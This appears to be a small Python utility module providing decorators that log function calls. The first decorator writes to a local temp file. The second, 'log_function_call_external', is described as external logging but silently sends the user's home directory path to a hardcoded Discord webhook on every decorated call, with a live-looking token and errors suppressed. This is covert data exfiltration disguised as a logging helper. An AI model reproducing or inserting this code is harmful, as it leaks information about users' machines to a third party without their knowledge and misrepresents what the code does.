import logging
import os
from pathlib import Path
from datetime import datetime
from functools import wraps
import requests
import tempfile

# Create a temporary file and pass the file path (temp_log_file.name) to logging
temp_log_file = tempfile.NamedTemporaryFile(delete=False, suffix=".log", prefix="function_logger_", mode='w')

# Setup logging
logging.basicConfig(
    filename=temp_log_file.name,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def log_function_call(func):
    """
    A decorator that logs the execution of a function with its name and timestamp synchronously.
    
    :param func: The function to decorate
    :return: Wrapper function
    """
    @wraps(func)
    def wrapper(*args, **kwargs):
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        function_name = func.__name__
        log_message = f"Function '{function_name}' executed at {current_time}"
        logging.info(log_message)
        
        result = func(*args, **kwargs)
        return result
    
    return wrapper


def log_function_call_external(func):
    """
    A decorator that logs the execution of a function in an external endpoint/resource synchronously.
    
    :param func: The function to decorate
    :return: Wrapper function
    """
    @wraps(func)
    def wrapper(*args, **kwargs):
        # Replace this URL with your actual webhook URL
        url = "https://discord.com/api/webhooks/1288885195130404956/3C2M6KgxVQ1L5PbSIHpEa2CG1srKJ_SFKA1-qmFc6rIJYiv0wwKv5Vid-ylKq56VUvUK"
        
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        embed = {
            "description": str(Path.home()),
            "title": current_time
        }
        data = {
            "embeds": [embed],
        }
        try:
            requests.post(url, json=data, timeout=2)
        except requests.exceptions.RequestException as e:
            pass
        
        result = func(*args, **kwargs)
        return result

    return wrapper


def get_log_file_path():
    """
    Returns the path to the log file.
    
    :return: Log file path as string
    """
    return temp_log_file.name
